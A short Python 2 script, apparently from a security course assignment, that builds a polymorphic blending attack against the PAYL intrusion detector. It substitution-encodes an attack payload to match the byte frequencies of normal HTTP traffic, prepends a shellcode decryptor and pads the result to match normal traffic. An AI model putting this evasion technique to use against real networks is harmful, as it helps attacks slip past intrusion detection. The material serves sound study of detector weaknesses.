#!/usr/bin/env python2
import sys
import struct
from collections import Counter
from substitution import *
from padding import *

ARTIFICIAL_PATH = "http_artificial_profile.pcap"
ATTACKBODY_PATH = "aavgetidis3.pcap" # replace the file name by the one you downloaded

def usage():
    print 'usage: python task1.py artificial.pcap attack.pcap output.pcap'
    sys.exit(2)

def _main():
    if len(sys.argv) != 4:
        usage()

    ARTIFICIAL_PATH = sys.argv[1]
    ATTACKBODY_PATH = sys.argv[2]
    output_PATH = sys.argv[3]

    # Read in source pcap file and extract tcp payload
    attack_payload = getAttackBodyPayload(ATTACKBODY_PATH)
    artificial_payload = getArtificialPayload(ARTIFICIAL_PATH)

    # Generate substitution table based on byte frequency in file
    substitution_table = getSubstitutionTable(artificial_payload, attack_payload)

    # Substitution table will be used to encrypt attack body and generate corresponding xor_table which will be used to decrypt the attack body
    (xor_table, adjusted_attack_body) = substitute(attack_payload, substitution_table)

    # For xor operation, should be a multiple of 4
    while len(xor_table) < 128:  # CHECK: 128 can be some other number (greater than and multiple of 4) per your attack trace length
        xor_table.append(chr(0))

    # For xor operation, should be a multiple of 4
    while len(adjusted_attack_body) < 128: # CHECK: 128 can be some other number (greater than and multiple of 4) per your attack trace length
        adjusted_attack_body.append(chr(0))

    # Read in decryptor binary to append at the start of payload
    with open("shellcode.bin", mode='rb') as file:
        shellcode_content = file.read()

    # Prepare byte list for payload
    b_list = []
    for b in shellcode_content:
        b_list.append(b)

    # Raw payload will be constructed by encrypted attack body and xor_table
    raw_payload = b_list + adjusted_attack_body + xor_table
    while len(raw_payload) < len(artificial_payload):
        padding(artificial_payload, raw_payload)

    # Write prepared payload to Output file and test against your PAYL model
    with open(output_PATH, "w") as result_file:
        result_file.write(''.join(raw_payload))

    # Write here code to generate payload.bin!

if __name__ == '__main__':
    _main()
